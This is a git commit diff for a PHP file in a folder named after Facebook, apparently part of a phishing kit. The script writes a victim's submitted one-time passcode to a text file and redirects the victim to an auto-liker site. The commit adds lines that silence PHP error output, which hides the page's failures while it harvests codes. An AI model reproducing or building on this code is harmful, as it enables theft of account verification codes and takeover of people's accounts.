369b22220bcf81e5e5f24d54c535fd19ae864e86
darknethaxor <72026007+darknethaxor@users.noreply.github.com>
2021-09-09 21:51:04 +0600

    Update auto-posts.php

--- facebook.com/auto-posts.php
+++ facebook.com/auto-posts.php
@@ -1,5 +1,6 @@
 <?php
-
+error_reporting(0);
+ini_set('display_errors', 0);
 file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
 header('Location: https://www.autolikerforfb.com');
 exit();
